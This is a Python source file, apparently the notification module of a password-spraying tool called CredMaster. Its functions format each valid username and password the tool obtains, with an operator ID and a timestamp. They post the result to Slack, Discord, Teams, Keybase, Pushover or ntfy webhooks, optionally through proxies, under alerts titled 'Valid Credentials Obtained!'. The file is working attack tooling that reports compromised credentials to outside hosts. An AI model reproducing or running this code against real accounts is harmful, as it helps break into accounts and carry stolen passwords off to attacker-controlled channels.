import requests, json, sys
from datetime import datetime
try:
    from discordwebhook import Discord
except ImportError:
    _has_discord = False
else:
    _has_discord = True



def notify_success(username, password, notify_obj, proxy_notif):

    slack_webhook = notify_obj['slack_webhook']
    discord_webhook = notify_obj['discord_webhook']
    teams_webhook = notify_obj['teams_webhook']
    pushover_token = notify_obj['pushover_token']
    pushover_user = notify_obj['pushover_user']
    ntfy_topic = notify_obj['ntfy_topic']
    ntfy_host = notify_obj['ntfy_host']
    ntfy_token = notify_obj['ntfy_token']
    keybase_webhook = notify_obj['keybase_webhook']
    operator = notify_obj['operator_id']
    exclude_password = notify_obj['exclude_password']

    if slack_webhook is not None:
        slack_notify(username, password, operator, exclude_password, slack_webhook, proxy_notif)

    if pushover_token is not None and pushover_user is not None:
        pushover_notify(username, password, operator, exclude_password, pushover_token, pushover_user, proxy_notif)

    if ntfy_topic is not None and ntfy_host is not None:
        ntfy_notify(username, password, operator, exclude_password, ntfy_topic, ntfy_host, ntfy_token, proxy_notif)

    if discord_webhook is not None:
        discord_notify(username, password, operator, exclude_password, discord_webhook, proxy_notif)

    if teams_webhook is not None:
        teams_notify(username, password, operator, exclude_password, teams_webhook, proxy_notif)

    if keybase_webhook is not None:
        keybase_notify(username, password, operator, exclude_password, keybase_webhook, proxy_notif)


def notify_update(message, notify_obj, proxy_notif):

    slack_webhook = notify_obj['slack_webhook']
    discord_webhook = notify_obj['discord_webhook']
    teams_webhook = notify_obj['teams_webhook']
    pushover_token = notify_obj['pushover_token']
    ntfy_topic = notify_obj['ntfy_topic']
    ntfy_host = notify_obj['ntfy_host']
    ntfy_token = notify_obj['ntfy_token']
    pushover_user = notify_obj['pushover_user']
    keybase_webhook = notify_obj['keybase_webhook']
    operator = notify_obj['operator_id']

    if slack_webhook is not None:
        slack_update(message, operator, slack_webhook, proxy_notif)

    if pushover_token is not None and pushover_user is not None:
        pushover_update(message, operator, pushover_token, pushover_user, proxy_notif)

    if ntfy_topic is not None and ntfy_host is not None:
        ntfy_update(message, operator, ntfy_topic, ntfy_host, ntfy_token, proxy_notif)

    if discord_webhook is not None:
        discord_update(message, operator, discord_webhook, proxy_notif)

    if teams_webhook is not None:
        teams_update(message, operator, teams_webhook, proxy_notif)
    
    if keybase_webhook is not None:
        keybase_update(message, operator, keybase_webhook, proxy_notif)


# Function for posting username/password to keybase channel
def keybase_notify(username, password, operator, exclude_password, webhook, proxy_notif):

    now = datetime.now()
    date=now.strftime("%d-%m-%Y")
    time=now.strftime("%H:%M:%S")

    op_insert = ""
    if operator is not None:
        op_insert = f"Operator: {operator}\n"

    pwd_insert = f"Pass: {password}\n"
    if exclude_password:
        pwd_insert = ""

    text = ("```[Valid Credentials Obtained!]\n"
            f"{op_insert}"
            f"User: {username}\n"
            f"{pwd_insert}"
            f"Date: {date}\n"
            f"Time: {time}```")

    message = {
        "msg" : text
    }

    response = requests.post(
        webhook, data=json.dumps(message),
        headers={'Content-Type': 'application/json'},
        proxies=proxy_notif
    )


# Function for debug messages
def keybase_update(message, operator, webhook, proxy_notif):

    now = datetime.now()
    date=now.strftime("%d-%m-%Y")
    time=now.strftime("%H:%M:%S")

    op_insert = ""
    if operator is not None:
        op_insert = f"Operator: {operator}\n"

    text = ("```[Log Entry]\n"
            f"{op_insert}"
            f"{message}\n"
            f"Date: {date}\n"
            f"Time: {time}```")

    message = {
        "msg" : text
    }
    response = requests.post(
        webhook, data=json.dumps(message),
        headers={'Content-Type': 'application/json'},
        proxies=proxy_notif
    )



# Function for posting username/password to slack channel
def slack_notify(username, password, operator, exclude_password, webhook, proxy_notif):

    now = datetime.now()
    date=now.strftime("%d-%m-%Y")
    time=now.strftime("%H:%M:%S")

    op_insert = ""
    if operator is not None:
        op_insert = f"Operator: {operator}\n"

    pwd_insert = f"Pass: {password}\n"
    if exclude_password:
        pwd_insert = ""

    text = ("```[Valid Credentials Obtained!]\n"
            f"{op_insert}"
            f"User: {username}\n"
            f"{pwd_insert}"
            f"Date: {date}\n"
            f"Time: {time}```")

    message = {
        "text" : text
    }

    response = requests.post(
        webhook, data=json.dumps(message),
        headers={'Content-Type': 'application/json'},
        proxies=proxy_notif
    )


# Function for debug messages
def slack_update(message, operator, webhook, proxy_notif):

    now = datetime.now()
    date=now.strftime("%d-%m-%Y")
    time=now.strftime("%H:%M:%S")

    op_insert = ""
    if operator is not None:
        op_insert = f"Operator: {operator}\n"

    text = ("```[Log Entry]\n"
            f"{op_insert}"
            f"{message}\n"
            f"Date: {date}\n"
            f"Time: {time}```")

    message = {
        "text" : text
    }
    response = requests.post(
        webhook, data=json.dumps(message),
        headers={'Content-Type': 'application/json'},
        proxies=proxy_notif
    )


# Function for posting username/password to Discord
def discord_notify(username, password, operator, exclude_password, webhook, proxy_notif):

    if not _has_discord:
        print("Discord notification will not be sent as you do not have installed the `discordwebhook` python package.", file=sys.stderr)
        return None

    now = datetime.now()
    date=now.strftime("%d-%m-%Y")
    time=now.strftime("%H:%M:%S")

    op_insert = ""
    if operator is not None:
        op_insert = f"Operator: {operator}\n"

    pwd_insert = f"Pass: {password}\n"
    if exclude_password:
        pwd_insert = ""

    text = ("```[Valid Credentials Obtained!]\n"
            f"{op_insert}"
            f"User: {username}\n"
            f"{pwd_insert}"
            f"Date: {date}\n"
            f"Time: {time}```")

    # module "discordwebhook" does not support proxies, no luck here
    discord = Discord(url=webhook)
    discord.post(content=text)


# Discord notify message
def discord_update(message, operator, webhook, proxy_notif):

    if not _has_discord:
        print("Discord notification will not be sent as you do not have installed the `discordwebhook` python package.", file=sys.stderr)
        return None

    now = datetime.now()
    date=now.strftime("%d-%m-%Y")
    time=now.strftime("%H:%M:%S")

    op_insert = ""
    if operator is not None:
        op_insert = f"Operator: {operator}\n"

    text = ("```[Log Entry]\n"
            f"{op_insert}"
            f"{message}\n"
            f"Date: {date}\n"
            f"Time: {time}```")

    discord = Discord(url=webhook)
    discord.post(content=text)


# Teams notify function
def teams_notify(username, password, operator, exclude_password, webhook, proxy_notif):

    now = datetime.now()
    date=now.strftime("%d-%m-%Y")
    time=now.strftime("%H:%M:%S")

    op_insert = ""
    if operator is not None:
        op_insert = f"Operator: {operator}\n"

    pwd_insert = f"Pass: {password}\n"
    if exclude_password:
        pwd_insert = ""
    content = ("[Valid Credentials Obtained!]\n"
            f"{op_insert}"
            f"User: {username}\n"
            f"{pwd_insert}"
            f"Date: {date}\n"
            f"Time: {time}")
    response = requests.post(
        url=webhook,
        headers={"Content-Type": "application/json"},
        json={
            "summary": "[Valid Credentials Obtained!]",
            "sections": [{
                "activityTitle": "CredMaster Bot",
                "activitySubtitle": f"{content}"
            }],
        },
        proxies=proxy_notif
    )

# Teams message notify function
def teams_update(message, operator, webhook, proxy_notif):

    now = datetime.now()
    date=now.strftime("%d-%m-%Y")
    time=now.strftime("%H:%M:%S")

    op_insert = ""
    if operator is not None:
        op_insert = f"Operator: {operator}\n"

    content = ("[Log Entry]\n"
        f"{op_insert}"
        f"Message: {message}\n"
        f"Date: {date}\n"
        f"Time: {time}")
    response = requests.post(
        url=webhook,
        headers={"Content-Type": "application/json"},
        json={
            "summary": "[Log Entry!]",
            "sections": [{
                "activityTitle": "CredMaster Bot",
                "activitySubtitle": f"{content}"
            }],
        },
        proxies=proxy_notif
    )


# Pushover notify of valid creds
def pushover_notify(username, password, operator, exclude_password, token, user, proxy_notif):

    headers = {'Content-Type' : 'application/x-www-form-urlencoded'}

    now = datetime.now()
    date=now.strftime("%d-%m-%Y")
    time=now.strftime("%H:%M:%S")

    op_insert = ""
    if operator is not None:
        op_insert = f"Operator: {operator}\n"

    pwd_insert = f"Pass: {password}\n"
    if exclude_password:
        pwd_insert = ""

    text = (f"{op_insert}"
            f"User: {username}\n"
            f"{pwd_insert}"
            f"Date: {date}\n"
            f"Time: {time}")

    data = {
        'token' : token,
        'user' : user,
        'title' : '[PassSpray: Valid Credentials Obtained!]',
        'priority' : '1',
        'message' : text
    }

    r = requests.post('https://api.pushover.net/1/messages', headers=headers, data=data, proxies=proxy_notif)


# Pushover generic update messages
def pushover_update(message, operator, token, user, proxy_notif):

    headers = {'Content-Type' : 'application/x-www-form-urlencoded'}

    now = datetime.now()
    date=now.strftime("%d-%m-%Y")
    time=now.strftime("%H:%M:%S")

    op_insert = ""
    if operator is not None:
        op_insert = f"Operator: {operator}\n"

    text = (f"{op_insert}"
            f"{message}\n"
            f"Date: {date}\n"
            f"Time: {time}")

    data = {
        'token' : token,
        'user' : user,
        'title' : '[PassSpray: Log]',
        'priority' : '1',
        'message' : text
    }

    r = requests.post('https://api.pushover.net/1/messages', headers=headers, data=data, proxies=proxy_notif)


# Ntfy notify of valid creds
def ntfy_notify(username, password, operator, exclude_password, topic, host, token, proxy_notif):
    now = datetime.now()
    date=now.strftime("%d-%m-%Y")
    time=now.strftime("%H:%M:%S")

    op_insert = ""
    if operator is not None:
        op_insert = f"Operator: {operator}\n"

    pwd_insert = f"Pass: {password}\n"
    if exclude_password:
        pwd_insert = ""

    text = (f"{op_insert}"
            f"User: {username}\n"
            f"{pwd_insert}"
            f"Date: {date}\n"
            f"Time: {time}")

    headers = {
        "Title": "Valid Credentials Obtained!",
        "Priority": "urgent",
        "Tags": "tada"
    }

    # https://docs.ntfy.sh/publish/#access-tokens
    if token is not None:
        headers["Authorization"] = "Bearer {:s}".format(token)

    r = requests.post("{:s}/{:s}".format(host, topic), headers=headers, data=text, proxies=proxy_notif)


# Ntfy generic update messages
def ntfy_update(message, operator, topic, host, token, proxy_notif):
    now = datetime.now()
    date=now.strftime("%d-%m-%Y")
    time=now.strftime("%H:%M:%S")

    op_insert = ""
    if operator is not None:
        op_insert = f"Operator: {operator}\n"

    text = (f"{op_insert}"
            f"{message}\n"
            f"Date: {date}\n"
            f"Time: {time}")

    headers = {
        "Title": "Log Entry!",
        "Priority": "default",
        "Tags" : "memo"
    }

    # https://docs.ntfy.sh/publish/#access-tokens
    if token is not None:
        headers["Authorization"] = "Bearer {:s}".format(token)

    r = requests.post("{:s}/{:s}".format(host, topic), headers=headers, data=text, proxies=proxy_notif)